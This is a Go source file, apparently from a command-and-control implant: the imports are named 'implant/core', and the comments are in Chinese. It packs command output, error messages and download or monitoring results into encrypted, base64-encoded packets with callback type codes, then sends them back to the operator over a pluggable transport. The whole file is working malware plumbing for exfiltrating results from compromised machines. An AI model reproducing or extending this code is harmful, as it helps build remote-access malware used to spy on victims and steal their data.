package communication

import (
	"bytes"
	"encoding/binary"
	"implant/core/encrypt"
	"implant/core/debuglog"
	"implant/core/utils"
)

// ErrorProcess 将错误信息作为结果回送（callbackType=31）。
func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	debuglog.Println(err)
	criticalSection(31, errMsgBytes)
}

// DataProcess 回送命令结果。callbackType==0 时先做码页转 UTF-8。
func DataProcess(callbackType int, b []byte) {
	result := b
	if callbackType == 0 {
		var err error
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	criticalSection(callbackType, result)
}

// criticalSection 构建加密结果包并经当前 Transport 回送。
// 【优化】原实现用全局锁串行化"加密 + base64 + 网络发送"全部阶段：
// 下载/监控等大流量包（base64 膨胀 + 大块加密）会阻塞所有其他结果，形成队头阻塞。
// 现在 MakePacket + EncodeBase64（CPU 密集）在锁外并发执行；
// 网络发送由各 adapter 自身的发送锁（sendMutex）串行化（发送必须串行防帧交错）。
// 协议特定的分帧（tcp 的 MetaInfo/normalData、http 的 POST body 等）由各 adapter 的
// SendResult 实现，core 不感知。
func criticalSection(callbackType int, b []byte) {
	packet := MakePacket(callbackType, b)
	if len(packet) == 0 {
		// K8: 加密失败（会话密钥过期/不可用）时禁止发送空载荷（原 base64 空串照发 → 服务端静默丢包无提示）
		debuglog.Printf("[COMM] 加密结果包失败，丢弃 (type=%d, %d bytes)\n", callbackType, len(b))
		return
	}
	b64Packet, err := encrypt.EncodeBase64(packet)
	if err != nil || len(b64Packet) == 0 {
		debuglog.Printf("[COMM] 结果包编码失败，丢弃 (type=%d)\n", callbackType)
		return
	}

	transport := GetTransport()
	if transport == nil {
		debuglog.Printf("[COMM] CurrentTransport 未设置，丢弃结果 (type=%d, %d bytes)\n", callbackType, len(b64Packet))
		return
	}
	if err := transport.SendResult(b64Packet); err != nil {
		debuglog.Printf("[COMM] SendResult 失败: %v\n", err)
	}
}

// MakePacket 构造 replyType(4) | result 并加密（优先会话密钥，失败回落旧加密）。
func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.EncryptWithSessionKey(buf.Bytes())
	if err != nil {
		// 【加密体系改造】加密失败直接丢弃该结果包（不再回落旧加密）
		return nil
	}
	return encrypted
}
